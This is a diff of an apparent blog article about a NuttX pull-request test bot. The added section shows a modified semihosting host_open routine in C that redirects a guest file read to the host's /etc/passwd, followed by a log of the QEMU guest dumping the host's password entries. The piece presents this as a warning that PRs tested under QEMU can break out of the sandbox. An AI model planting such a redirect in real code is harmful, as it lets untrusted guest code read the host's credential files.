@@ -100,41 +100,75 @@ spawn qemu-system-aarch64 \
 <div class="example-wrap"><pre class="language-bash"><code>@nuttxpr test qemu-armv8a:netnsh</code></pre></div>
 <p><a href="https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664196921">See the Test Log</a></p>
 <h1 id="semihosting-breakout"><a class="doc-anchor" href="#semihosting-breakout">§</a>3 Semihosting Breakout</h1>
-<p>https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141</p>
-<div class="example-wrap"><pre class="language-c"><code>int host_open(const char *pathname, int flags, int mode)
-{
+<p><em>Testing a Pull Request with QEMU: Should be Totally Safe right?</em></p>
+<p>Nope <strong>Beware of Semihosting</strong>, it might break out from the QEMU Sandbox and into our Host Computer! Here’s why…</p>
+<div class="example-wrap"><pre class="language-bash"><code>## Let&#39;s run this on QEMU RISC-V Kernel Build
+## (For rv-virt:knsh64)
+nsh&gt; hello
+Hello, World!!</code></pre></div>
+<p><strong>For RISC-V Kernel Build</strong>: <em>hello</em> is actually an <strong>ELF Executable</strong> located at <em>/system/bin</em>…</p>
+<div class="example-wrap"><pre class="language-bash"><code>## Equivalent to this ELF Executable
+## (For rv-virt:knsh64)
+nsh&gt; /system/bin/hello
+Hello, World!!</code></pre></div>
+<p><em>Where is /system/bin? Don’t recall bundling any ELF Executables?</em></p>
+<p>The ELF Executables exist on Our Computer’s <strong>Local Filesystem</strong>… Outside QEMU and the NuttX Filesystem!</p>
+<p><img src="https://lupyuen.org/images/testbot2-apps.png" alt="TODO" /></p>
+<p>This is called <a href="https://lupyuen.github.io/articles/semihost#nuttx-calls-semihosting"><strong>Semihosting</strong></a>, it gives QEMU direct access to our computer’s filesystem. We <a href="https://nuttx.apache.org/docs/latest/platforms/risc-v/qemu-rv/boards/rv-virt/index.html#configurations"><strong>Enabled Semihosting</strong></a> when we started QEMU…</p>
+<div class="example-wrap"><pre class="language-bash"><code>## For NuttX Kernel Build: (rv-virt:knsh64)
+## QEMU must run with Semihosting Enabled
+qemu-system-riscv64 \
+  -semihosting \
+  -M virt,aclint=on \
+  -cpu rv64 \
+  -bios none \
+  -kernel nuttx \
+  -nographic</code></pre></div>
+<p><a href="TODO">(Semihosting is also used by <strong>OpenOCD</strong> for debugging <strong>Arm32 Devices</strong>)</a></p>
+<p><em>Thus NuttX could break out of QEMU? And access anything in our computer’s filesystem?</em></p>
+<p>Exactly! This is our <strong>“Exploit Code”</strong> for NuttX Semihosting: <a href="https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141">riscv_hostfs.c</a></p>
+<div class="example-wrap"><pre class="language-c"><code>// When NuttX opens a file via Semihosting...
+int host_open(const char *pathname, int flags, int mode) {
+
+  // Let&#39;s print the pathname
   _info(&quot;pathname=%s\n&quot;, pathname);
+
+  // If NuttX tries to access the `hello` ELF Executable:
+  // Route the access to `/etc/passwd` instead
   const char *pathname2 =
     (strcmp(pathname, &quot;../apps/bin/hello&quot;) == 0)
     ? &quot;/etc/passwd&quot;
     : pathname;
-  struct
-  {
+
+  // Rest of the code is unchanged
+  // Except `pathname` becomes `pathname2`
+  struct {
     const char *pathname;
     long mode;
     size_t len;
-  } open =
-  {
+  } open = {
     .pathname = pathname2,
-    .mode = host_flags_to_mode(flags),
-    .len = strlen(pathname2),
+    .mode     = host_flags_to_mode(flags),
+    .len      = strlen(pathname2),
   };
 
-#ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
-  up_clean_dcache(pathname, pathname + open.len + 1);
-#endif
-
+  // Make a Semihosting Call to QEMU
+  // Via the RISC-V EBREAK Instruction
   return host_call(HOST_OPEN, &amp;open, sizeof(open));
 }</code></pre></div>
-<p>https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705</p>
-<div class="example-wrap"><pre class="language-bash"><code>NuttShell (NSH) NuttX-12.4.0
+<p>Something seriously sinister happens in NuttX and QEMU… Our “Exploit Code” dumps <em>/etc/passwd</em> from our <strong>Local Computer</strong>!</p>
+<div class="example-wrap"><pre class="language-bash"><code>## Let&#39;s dump the `hello` ELF Executable
 nsh&gt; cat /system/bin/hello
-[    6.841514] host_open: pathname=../apps/bin/cat
-[    6.842859] host_open: pathname=../apps/bin/hello
+host_open: pathname=../apps/bin/cat
+host_open: pathname=../apps/bin/hello
+
+## Whoa NuttX dumps `/etc/passwd` from our Local Computer!
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
-daemon:*:1:1:System Services:/var/root:/usr/bin/false
-nsh&gt; </code></pre></div><h1 id="llm-says-nope"><a class="doc-anchor" href="#llm-says-nope">§</a>4 LLM Says Nope!</h1>
+daemon:*:1:1:System Services:/var/root:/usr/bin/false</code></pre></div>
+<p><a href="https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705#file-gistfile1-txt-L1238-L1246">(See the <strong>Complete Log</strong>)</a></p>
+<h1 id="llm-says-nope"><a class="doc-anchor" href="#llm-says-nope">§</a>4 LLM Says Nope!</h1>
+<p>PR is not safe!</p>
 <p>https://github.com/lupyuen2/wip-nuttx/pull/89</p>
 <p>https://patch-diff.githubusercontent.com/raw/lupyuen2/wip-nuttx/pull/89.diff</p>
 <p>https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900</p>
